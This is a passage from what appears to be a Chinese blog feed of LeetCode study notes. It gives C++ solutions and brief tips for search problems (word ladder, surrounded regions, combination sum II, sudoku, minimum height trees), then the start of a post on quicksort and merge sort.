class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; wordLength; ++k) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (wordList[i][k] != wordList[j][k])</span><br><span class="line">                        ++count;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (count == <span class="number">1</span>)</span><br><span class="line">                    temp.<span class="built_in">push_back</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">            connection.<span class="built_in">push_back</span>(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; wordLength; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (beginWord[j] != wordList[i][j])</span><br><span class="line">                    ++count;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">1</span>) &#123;</span><br><span class="line">                ladderTrace.<span class="built_in">push</span>(i);</span><br><span class="line">                visited[i] = <span class="literal">true</span>;</span><br><span class="line">                first.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span> (!ladderTrace.<span class="built_in">empty</span>() &amp;&amp; !flag) &#123;</span><br><span class="line">            <span class="type">int</span> count = ladderTrace.<span class="built_in">size</span>();</span><br><span class="line">            ++depth;</span><br><span class="line">            <span class="keyword">while</span> (count--) &#123;</span><br><span class="line">                <span class="type">int</span> next = ladderTrace.<span class="built_in">front</span>();</span><br><span class="line">                ladderTrace.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (wordList[next] == endWord) &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i : connection[next]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i]) &#123;</span><br><span class="line">                        ladderTrace.<span class="built_in">push</span>(i);</span><br><span class="line">                        visited[i] = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count = ladderTrace.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;&#123;beginWord, endWord&#125;&#125;;</span><br><span class="line">        ladder.<span class="built_in">push_back</span>(beginWord);</span><br><span class="line">        visited.<span class="built_in">assign</span>(length, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> index : first) &#123;</span><br><span class="line">            ladder.<span class="built_in">push_back</span>(wordList[index]);</span><br><span class="line">            <span class="built_in">dfs</span>(wordList, endWord, ladders, ladder, connection, index, visited, depth);</span><br><span class="line">            ladder.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ladders;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;string&gt;&amp; wordList, string&amp; endWord, vector&lt;vector&lt;string&gt;&gt; &amp;ladders, vector&lt;string&gt; &amp;ladder, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;connection, <span class="type">int</span> index, vector&lt;<span class="type">bool</span>&gt; visited, <span class="type">int</span> depth)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">1</span> &amp;&amp; ladder.<span class="built_in">back</span>() == endWord) &#123;</span><br><span class="line">            ladders.<span class="built_in">push_back</span>(ladder);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[index] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : connection[index]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[num]) &#123;</span><br><span class="line">                ladder.<span class="built_in">push_back</span>(wordList[num]);</span><br><span class="line">                <span class="built_in">dfs</span>(wordList, endWord, ladders, ladder, connection, num, visited, depth - <span class="number">1</span>);</span><br><span class="line">                ladder.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[index] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：先广度搜索找出最短长度，再用深度搜索找路径，但是我的代码时间超限，还可以继续优化<del>(我不会了)</del>。</p></li></ul><h2 id="四、练习"><a href="#四、练习" class="headerlink" title="四、练习"></a>四、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/surrounded-regions">被围绕的区域</a><br>给你一个mxn的矩阵board，由若干字符’X’和’O’组成，捕获所有被围绕的区域：</p><ul><li>连接：一个单元格与水平或垂直方向上相邻的单元格连接。</li><li>区域：连接所有’O’的单元格来形成一个区域。</li><li>围绕：如果您可以用’X’ 单元格连接这个区域，并且区域中没有任何单元格位于board边缘，则该区域被’X’单元格围绕。<br>通过<strong>原地</strong>将输入矩阵中的所有’O’替换为’X’来捕获被围绕的区域。你不需要返回任何值。<br><img src="https://pic.leetcode.cn/1718167191-XNjUTG-image.png" alt="示例图"></li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; direction = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = board.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = board[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[i][<span class="number">0</span>] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, i, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (board[i][n - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, i, n - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[<span class="number">0</span>][j] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, <span class="number">0</span>, j);</span><br><span class="line">            <span class="keyword">if</span> (board[m - <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, m - <span class="number">1</span>, j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;#&#x27;</span>) board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, <span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        board[x][y] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> x1 = x + direction[i];</span><br><span class="line">            <span class="type">int</span> y1 = y + direction[i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (x1 &lt; <span class="number">0</span> || x1 &gt;= board.<span class="built_in">size</span>() || y1 &lt; <span class="number">0</span> || y1 &gt;= board[<span class="number">0</span>].<span class="built_in">size</span>()) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (board[x1][y1] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, x1, y1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和大西洋太平洋水流问题差不多，因为起点如果从’X’开始，那么会很麻烦，不如从边缘的’O’开始。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/combination-sum-ii">组合总和 II</a><br>给定一个候选人编号的集合candidates和一个目标数target，找出candidates中所有可以使数字和为target的组合。<br>candidates中的每个数字在每个组合中只能使用一次，解集不能包含重复的组合。  </p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">combinationSum2</span>(vector&lt;<span class="type">int</span>&gt;&amp; candidates, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(candidates.<span class="built_in">begin</span>(), candidates.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">onPath</span><span class="params">(candidates.size(), <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="built_in">dfs</span>(res, temp, onPath, candidates, <span class="number">0</span>, <span class="number">0</span>, target);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; res, vector&lt;<span class="type">int</span>&gt;&amp; candidate, vector&lt;<span class="type">bool</span>&gt;&amp; onPath, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; candidates, <span class="type">int</span> depth, <span class="type">int</span> sum, <span class="type">const</span> <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; target) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(candidate);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = depth; i &lt; candidates.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            candidate.<span class="built_in">push_back</span>(candidates[i]);</span><br><span class="line">            onPath[i] = <span class="literal">true</span>;</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || candidates[i] != candidates[i - <span class="number">1</span>] || (candidates[i] == candidates[i - <span class="number">1</span>] &amp;&amp; onPath[i - <span class="number">1</span>])) </span><br><span class="line">              <span class="built_in">dfs</span>(res, candidate, onPath, candidates, i + <span class="number">1</span>, sum, target);</span><br><span class="line">            candidate.<span class="built_in">pop_back</span>();</span><br><span class="line">            onPath[i] = <span class="literal">false</span>;</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：主要是需要记录相同的值的出现情况。做完这道题也可以尝试<a href="https://leetcode.cn/problems/permutations-ii">全排列 II</a></p></li><li><p>题目三：<a href="https://leetcode.cn/problems/sudoku-solver">解数独</a><br>编写一个程序，通过填充空格来解决数独问题。<br>数独的解法需遵循如下规则：</p><ul><li>数字1-9在每一行只能出现一次。</li><li>数字1-9在每一列只能出现一次。</li><li>数字1-9在每一个以粗实线分隔的3x3宫内只能出现一次。（请参考示例图）<br>数独部分空格内已填入了数字，空白格用’.’表示。<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2021/04/12/250px-sudoku-by-l2g-20050714svg.png" alt="示例图"></li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; hash1;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; hash2;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; hash3;</span><br><span class="line">    <span class="type">bool</span> valid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Solution</span>() : <span class="built_in">hash1</span>(<span class="number">9</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">9</span>, <span class="literal">false</span>)), <span class="built_in">hash2</span>(<span class="number">9</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">9</span>, <span class="literal">false</span>)), <span class="built_in">hash3</span>(<span class="number">9</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">9</span>, <span class="literal">false</span>)), <span class="built_in">valid</span>(<span class="literal">false</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">solveSudoku</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; locations;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    locations.<span class="built_in">push_back</span>(&#123;i, j&#125;);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                hash1[i][board[i][j] - <span class="string">&#x27;0&#x27;</span> - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                hash2[j][board[i][j] - <span class="string">&#x27;0&#x27;</span> - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                hash3[(i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>][board[i][j] - <span class="string">&#x27;0&#x27;</span> - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> size = locations.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">dfs</span>(board, locations, <span class="number">0</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, <span class="type">const</span> vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; locations, <span class="type">int</span> depth, <span class="type">const</span> <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == size) &#123;</span><br><span class="line">            valid = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> [i, j] = locations[depth];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt; <span class="number">10</span> &amp;&amp; !valid; ++k) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!hash1[i][k - <span class="number">1</span>] &amp;&amp; !hash2[j][k - <span class="number">1</span>] &amp;&amp; !hash3[(i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>][k - <span class="number">1</span>]) &#123;</span><br><span class="line">                hash1[i][k - <span class="number">1</span>] = hash2[j][k - <span class="number">1</span>] = hash3[(i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>][k - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                board[i][j] = k + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="built_in">dfs</span>(board, locations, depth + <span class="number">1</span>, size);</span><br><span class="line">                hash1[i][k - <span class="number">1</span>] = hash2[j][k - <span class="number">1</span>] = hash3[(i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>][k - <span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：暴力的深度搜索即可，记得记录状态。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/minimum-height-trees">最小深度树</a><br>树是一个无向图，其中任何两个顶点只通过一条路径连接。换句话说，任何一个没有简单环路的连通图都是一棵树。<br>给你一棵包含n个节点的树，标记为0到n-1。给定数字n和一个有n-1条无向边的edges列表(每一个边都是一对标签)，其中edges[i]&#x3D;[ai, bi]表示树中节点ai和bi之间存在一条无向边。可选择树中任何一个节点作为根。当选择节点x作为根节点时，设结果树的高度为h。在所有可能的树中，具有最小高度的树(即，min(h))被称为最小高度树 。<br>请你找到所有的最小高度树并按任意顺序返回它们的根节点标签列表。<br><img src="https://assets.leetcode.com/uploads/2020/09/01/e1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findMinHeightTrees</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;edges)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adj</span>(n);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">degree</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;edge : edges) &#123;</span><br><span class="line">            adj[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(edge[<span class="number">1</span>]);</span><br><span class="line">            adj[edge[<span class="number">1</span>]].<span class="built_in">push_back</span>(edge[<span class="number">0</span>]);</span><br><span class="line">            degree[edge[<span class="number">0</span>]]++;</span><br><span class="line">            degree[edge[<span class="number">1</span>]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (degree[i] == <span class="number">1</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> remainingNodes = n;</span><br><span class="line">        <span class="keyword">while</span> (remainingNodes &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> levelSize = q.<span class="built_in">size</span>();</span><br><span class="line">            remainingNodes -= levelSize;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; levelSize; ++i) &#123;</span><br><span class="line">                <span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> v : adj[u]) &#123;</span><br><span class="line">                    degree[v]--;</span><br><span class="line">                    <span class="keyword">if</span> (degree[v] == <span class="number">1</span>) q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(q.<span class="built_in">front</span>());</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要用到图论的知识——拓扑排序。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 搜索算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(四): 排序</title>
      <link href="/post/860c4f6f.html"/>
      <url>/post/860c4f6f.html</url>
      
        <content type="html"><![CDATA[<p>排序算法：包括快排，归并排序，桶排序，哈希排序等。</p><h2 id="一、快排"><a href="#一、快排" class="headerlink" title="一、快排"></a>一、快排</h2><ul><li><p>算法介绍：对于当前一个未排序片段，我们先随机选择一个位置当作中枢点，然后通过遍历操作，将所有比中枢点小的数字移动到其左侧，再将所有比中枢点大的数字移动到其右侧。操作完成后，我们再次对中枢点左右侧的片段再次进行快速排序即可。可证明，如果中枢点选取是随机的，那么该算法的平均复杂度可以达到<code>O(nlogn)</code>，最差情况下复杂度则为<code>O(n^2)</code>。</p></li><li><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quickSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">int</span> pivot = l + (<span class="built_in">rand</span>() % (r - l + <span class="number">1</span>));</span><br><span class="line">  <span class="type">int</span> pivot_val = nums[pivot];</span><br><span class="line">  <span class="built_in">swap</span>(nums[l], nums[pivot]);</span><br><span class="line">  <span class="type">int</span> i = l + <span class="number">1</span>, j = r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; j &amp;&amp; nums[j] &gt;= pivot_val) --j;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; j &amp;&amp; nums[i] &lt;= pivot_val) ++i;</span><br><span class="line">      <span class="keyword">if</span> (i == j) <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">swap</span>(nums[i], nums[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> new_pivot = nums[i] &lt;= nums[l] ? i : i - <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">swap</span>(nums[l], nums[new_pivot]);</span><br><span class="line">  <span class="built_in">quickSort</span>(nums, l, new_pivot - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">quickSort</span>(nums, new_pivot + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>补充：枢纽pivot的选择有三点平均法，末尾法，首值法，但是随机取的效率貌似是最好的，所以快排又叫做随机排序法(不稳定的排序)。</p></li></ul><h2 id="二、归并排序"><a href="#二、归并排序" class="headerlink" title="二、归并排序"></a>二、归并排序</h2><ul><li><p>算法介绍：主要用到分治的思想，对于一个未排序片段，我们可以先分别排序其左半侧和右半侧，然后将两侧重新组合（“治”）；排序每个半侧时可以通过递归再次把它切分成两侧（“分”）。</p></li><li><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mergeSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, vector&lt;<span class="type">int</span>&gt; &amp;cache, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">mergeSort</span>(nums, cache, l, mid);</span><br><span class="line">  <span 